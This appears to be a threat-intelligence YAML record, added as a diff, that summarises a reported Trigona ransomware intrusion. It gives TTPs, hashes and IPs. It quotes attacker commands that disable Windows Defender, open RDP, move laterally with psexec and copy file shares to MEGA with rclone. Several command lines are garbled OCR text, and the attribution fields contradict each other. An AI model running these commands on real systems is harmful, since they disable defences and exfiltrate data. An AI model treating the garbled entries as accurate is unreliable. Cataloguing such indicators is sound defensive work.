@@ -1,0 +1,239 @@
+description: In late December 2022, threat actors exploited a publicly exposed Remote
+  Desktop Protocol (RDP) host, leading to data exfiltration and the deployment of
+  Trigona ransomware. On Christmas Eve, within just three hours of gaining initial
+  access, the threat actors executed ransomware across the entire network.
+attribution:
+- 'Threat Actor: Unknown'
+- 'APT Group: Unknown'
+- 'Country: Ukraine (initial IP geo-location)'
+- Threat Actor: Trigona
+- APT Group: Trigona
+- Country: Unknown
+malware_families:
+- Trigona
+- Trigona Ransomware
+TTPs:
+  processes:
+  - netscan.exe
+  - rclone.exe
+  - build_redacted.exe
+  - cmd.exe
+  - powershell.exe
+  - net.exe
+  - whoami.exe
+  - taskkill.exe
+  - reg.exe
+  - SU64.exe
+  - PSKILL64.exe
+  - notepad.exe
+  - explorer.exe
+  - rdp.exe
+  - sd.exe
+  - mspaint.exe
+  commandline:
+  - C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+  - C:\Windows\system32\net.exe group /domain
+  - C:\Windows\system32\net.exe group "domain admins" /domain
+  - C:\Windows\system32\whoami.exe
+  - taskkill /F /IM MSASCuiL.exe
+  - powershell Set-MpPreference -DisableRealtimeMonitoring $true
+  - powershell Set-MpPreference -MAPSReporting 0
+  - powershell Set-MpPreference -SubmitSamplesConsent 2
+  - REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v
+    "HideSCAHealth" /t REG_DWORD /d 0x1 /f
+  - REG ADD "HKCU\Software\Policies\Microsoft\Windows\Explorer" /v "DisableNotificationCenter"
+    /t REG_DWORD /d 0x1 /f
+  - REG DELETE "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth"
+    /f
+  - REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware"
+    /t REG_DWORD /d 0x1 /f
+  - REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "AllowFastServiceStartup"
+    /t REG_DWORD /d 0x0 /f
+  - REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "ServiceKeepAlive"
+    /t REG_DWORD /d 0x0 /f
+  - REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
+    /v "DisableIOAVProtection" /t REG_DWORD /d 0x1 /f
+  - REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
+    /v "DisableRealtimeMonitoring" /t REG_DWORD /d 0x1 /f
+  - REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "DisableBlockAtFirstSeen"
+    /t REG_DWORD /d 0x1 /f
+  - REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "LocalSettingOverrideSpynetReporting"
+    /t REG_DWORD /d 0x0 /f
+  - REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "SubmitSamplesConsent"
+    /t REG_DWORD /d 0x2 /f
+  - REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration" /v
+    "NotificationSuppress" /t REG_DWORD /d 0x1 /f
+  - '%~dp0\SU64 /w /c cmd.exe /cfor %%A IN (WinDefend WdFilter WdBoot Sense WdNisDrv
+    WdNisSvc SecurityHealthService) DO net stop %%A'
+  - cmd /c "C:\Users\Administrator\Music\start .bat" --> cd %~dp0 --> rclone.exe copy
+    "\\\[FILE SERVER]\\human resources" MEGA:domain -q --ignore-existing --auto-confirm
+    --multi-thread-streams 12 --transfers 12
+  - cmd /c "C:\Users\Administrator\Music\start .bat" --> cd %~dp0 --> rclone.exe copy
+    "\\\[FILE SERVER]\\Files" MEGA:domain -q --ignore-existing --auto-confirm --multi-thread-streams
+    12 --transfers 12
+  - netsh advfirewall firewall add rule name="rdp" dir=in protocol=tcp localport=3389
+    action=allow
+  - netsh advfirewall firewall set rule group="windows management instrumentation
+    (wmi)" new enable=yes
+  - reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
+    /t REG_DWORD /d 0 /f
+  - notepad.exe "C:\\Users Aduinistrator Rusic\\start ~ xoms.bat"
+  - explorer.exe C:Windows\\Explorer EXEcad.exe :\\Windows\\eystems2\\cnd.exe /o C:\\Users\\Adninistrator\\Music\\start
+    = xom = rorwr.bat
+  - explorer.exe 2 \\Windows\\Explorer . EXEcad.exe :\\Windows \\eystemsz\\cnd. exe
+    / 'C:\\Users\\Adaintstrator\\Nustc\\start ~ xomos ~ xomcx bat
+  - explorer.exe :\\Windows\\Explorer . EXEcad.exe C\\Windows \\eystend2\\cnd. exe
+    /c *C:\\Users\\Adninistrator\\Wusiclstart ~ xoms bat
+  - explorer.exe Co\\Windows\\Explorer . EXEcad.exe G5 \\Windows\\systems2\\cnd.exe
+    /o 'C:\\ALLibraries\\start = xomun.bat"
+  - explorer.exe C:Windows\\Explorer EXEed.exe :\\Windows \\systensz\\cnd.exe /c *'C:\\ALLbraries\\start
+    ~ xomus ~ somes.bat*
+  - powershellexe C:\\Windoms\\Systen32\\WindonsPonerShel11v1.6\\povershellexe
+  - explorer.exe C:WWindows\\Explorer XEponershell exe \\Windors\\Systens2\\WindowsPowershe11\\v1
+    8\\pomershe1l. exe
+  - explorer.exe 2 \\Windows\\Explorer . EXEbuild. e C:\\Users\\Adnintstrator\\usteiburld
+    exe
+  - explorer.exe C:\\Windows \\Explorer . EXEpowershell.exe, C:\\Windows\\Sys ten32\\WindowsPawer
+    Shel1\\v1 .0\\ ponershe1l. exe
+  powershell:
+  - powershell Set-MpPreference -DisableRealtimeMonitoring $true
+  - powershell Set-MpPreference -MAPSReporting 0
+  - powershell Set-MpPreference -SubmitSamplesConsent 2
+  - C:\\Windoms\\Systen32\\WindonsPonerShel11v1.6\\povershellexe
+  - C:\\Windows\\Sys ten32\\WindowsPawer Shel1\\v1 .0\\ ponershe1l. exe
+  scripting_engine:
+  - C:\\Users Aduinistrator Rusic\\start ~ xoms.bat
+  - C:\\Users\\Adninistrator\\Music\\start = xom = rorwr.bat
+  - C:\\Users\\Adaintstrator\\Nustc\\start ~ xomos ~ xomcx bat
+  - C:\\Users\\Adninistrator\\Wusiclstart ~ xoms bat
+  - C:\\ALLibraries\\start = xomun.bat
+  - C:\\ALLbraries\\start ~ xomus ~ somes.bat
+  registry_keys:
+  - HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer
+  - HKCU\Software\Policies\Microsoft\Windows\Explorer
+  - HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+  - HKLM\SOFTWARE\Policies\Microsoft\Windows Defender
+  - HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection
+  - HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet
+  - HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration
+  - HKLM\SOFTWARE\Policies\Microsoft\Windows Defender /v "DisableAntiSpyware" /t REG_DWORD
+    /d 1 /f
+  - HKLM\SOFTWARE\Microsoft\Windows Defender /v *DisableAntiSpyware /t REG DWORD /d
+    *1 /f
+  - HKLM\SOFTWARE\Microsoft\Windows Defender /v "DisableAntiVirus* /t REG_DWORD /d
+    *1 /f
+  - HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "SecurityHealth" /f
+  - HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v "SettingsPageVisibility"
+    /t REG SZ /d "hide:windowsdefender" /f
+  image_load:
+  - C:\\Program Files (x86) Wicrosoft\\Edge\\plication\\asedge.exe single-argument
+    \\\\16G:\\Progran Files (x66) Wicrosoft\\Edge AppLicat on\\asdge
+  - 'C:\\Program Files (x86) Wirosoft\\Edge\\plicationtasedge.exe ~-single-sraument
+    \\\\18C:\\Program Files (x86) Wirosofc\\Edge\\pication\\asedge.exe single: e'
+  network_connections:
+  - netscan.exe -> various hosts on the network
+  - rclone.exe -> Mega.io
+  - build_redacted.exe -> SMB connections to remote hosts
+  - rdp.exe /vi%0 /u:{user} /p:{pass}
+  - psexec.exe -accepteula -nobanner -s \\\\%0 c:\\temp\\x.bat o true
+  - psexec.exe -accepteula -nobanner -s \\\\%0 -c auth.bat . o true
+  file_activity:
+  - C:\Users\Administrator\Music\newuser.bat
+  - C:\Users\Administrator\Music\newnewuser.bat
+  - C:\Users\Administrator\Music\DefenderOFF.bat
+  - C:\Users\Administrator\Music\DefenderON.bat
+  - C:\Users\Administrator\Music\ipall.bat
+  - C:\Users\Administrator\Music\ipinfo.bat
+  - C:\Users\Administrator\Music\ipwho.bat
+  - C:\Users\Administrator\Music\openrdp.bat
+  - C:\Users\Administrator\Music\psNET.bat
+  - C:\\Users Aduinistrator Rusic\\start ~ xoms.bat
+  - C:\\Users\\Adninistrator\\Music\\start = xom = rorwr.bat
+  - C:\\Users\\Adaintstrator\\Nustc\\start ~ xomos ~ xomcx bat
+  - C:\\Users\\Adninistrator\\Wusiclstart ~ xoms bat
+  - C:\\ALLibraries\\start = xomun.bat
+  - C:\\ALLbraries\\start ~ xomus ~ somes.bat
+  persistence:
+  - HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+  - HKLM\SOFTWARE\Microsoft\Windows Defender /v "DisableAntiSpyware" /t REG_DWORD
+    /d 1 /f
+  - HKLM\SOFTWARE\Microsoft\Windows Defender /v *DisableAntiSpyware /t REG DWORD /d
+    *1 /f
+  - HKLM\SOFTWARE\Microsoft\Windows Defender /v "DisableAntiVirus* /t REG_DWORD /d
+    *1 /f
+  pipes:
+  - ''
+  process_relations:
+  - netscan.exe -> rclone.exe
+  - rclone.exe -> Mega.io
+  - build_redacted.exe -> SMB connections to remote hosts
+  - notepad.exe -> explorer.exe
+  - explorer.exe -> cmd.exe
+  - cmd.exe -> powershell.exe
+  - powershell.exe -> build_redacted.exe
+IOCs:
+  hashes:
+  - build_redacted.exe: 1852be15aa8dcf664291b3849bd348e4
+  - DefenderOFF.bat: c5d7ce243c1d735d9ca419cc916b87ec
+  - ipall.bat: b2bb4d49c38f06a42f15b39744d425d0
+  - DefenderON.bat: 718f68b24d1e331e60e1a10c92a81961
+  - ipinfo.bat: 09dcedb5a6ad0ef5bbea4496486ba4e5
+  - ipwho.bat: 0fd71d43c1f07d6a8fa73b0fa7beffa7
+  - newnewuser.bat: ca49787e7ea3b81fccca2ae45852a3d6
+  - newuser.bat: cf39e14df6c95285f23cd6d16a2a8a4e
+  - openrdp.bat: 44370f5c977e415981febf7dbb87a85c
+  - 1852be15aa8dcf664291b3849bd348e4
+  - eea811d2a304101cc0b0edebe6590ea0f3da0a27
+  - d743daa22fdf4313a10da027b034c603eda255be037cb45b28faea23114d3b8a
+  - c5d7ce243c1d735d9ca419cc916b87ec
+  - 21b7460aa5f7eb7a064d2a7a6837da57719f9c2e
+  - d6d8302d8db7f17aaa45059b60eb8de33166c95d1d833ca4d5061201e4737009
+  - b2bb4d49c38f06a42f15b39744d425d0
+  - 2f5991e67615763865b7e4c4c9558eb447ed7c0d
+  - 12f838b54c6dac78f348828fe34f04ac355fa8cc24f8d7c7171d310767463c6c
+  - 718f68b24d1e331e60e1a10c92a81961
+  - a73fbffe33ea82b20c4129e552fbc5b76891080e
+  - 40fe2564e34168bf5470bbe0247bc614117334753a107b2baeb113154b4de6a7
+  - 09dcedb5a6ad0ef5bbea4496486ba4e5
+  - 723baea0983b283eebd8331025a52eb13d5daaa7
+  - 277550c9d5771a13b65e90f5655150e365516215a714ffd3f075b5b426e2ddc1
+  - 0fd71d43c1f07d6a8fa73b0fa7beffa7
+  - 52f7e3437d83e964cb2fcc1175fad0611a12e26c
+  - 35ff76d763714812486a2f6ad656d124f3fcdfc4d16d49df6221325c8ae8827a
+  - ca49787e7ea3b81fccca2ae45852a3d6
+  - 1b65d347bea374bb9915c445382ae696ba4064d4
+  - 7f7e61246445872aec37808a2c20f5f055fb5fba8bd3f5af5194762114700180
+  - cf39e14df6c95285f23cd6d16a2a8a4e
+  - d5d686acb2ad66fa2e01bbfc4e166df80dc76d06
+  - 0596b08f0f4c6526b568fc7c9d55abd95230a48feb07b67482392d31c40f3aea
+  - 44370f5c977e415981febf7dbb87a85c
+  - ac0dce3b0f5b8d187a2e3f29efc358538fd4aa45
+  - 56b08aa03bd8c0ea094cfeb03d5954ffd857bac42df929dc835eea62f32b09e0
+  - 3bce26176509adf3f9d8e2e274d92f9e
+  - 8003bcb91775386084dcedeca3e1ea68d50888c3
+  - 54586ffce0dcb658de916cc46539b5a1e564aaa72be2620fc4f9133ca54aba64
+  - 27f7186499bc8d10e51d17d3d6697bc5
+  - 52332ce16ee0c393b8eea6e71863ad41e3caeafd
+  - 18f0898d595ec054d13b02915fb7d3636f65b8e53c0c66b3c7ee3b6fc37d3566
+  - 037d9a5307e32252a3556bbe038a0722
+  - 641b7cf77286bd86eb144147bbf073bbd2c9c261
+  - 8cf27e05e639fcc273d3cceadf68e69573b58e74b4bfce8460a418366a782fbd
+  - 08aaa7f4e2c1278c0e9b06ce4e6c217d
+  - 2cb4b4fb1ec8305ef03e1802f56be22b12379a0c
+  - 8834c84cfd7e086f74a2ffa5b14ced2c039d78feda4bad610aba1c6bb4a6ce7f
+  IPs:
+  - 77.83.36.6
+  - 193.106.31.98
+  ips:
+  - 77.83.36.6
+  - 193.106.31.98
+  domains:
+  - ''
+  urls:
+  - ''
+authors:
+- '@MetallicHack'
+- '@pcsc0ut'
+reference: https://thedfirreport.com/2024/01/29/buzzing-on-christmas-eve-trigona-ransomware-in-3-hours/
+date_of_publication: January 29, 2024
+file_creation_date: July 28, 2025
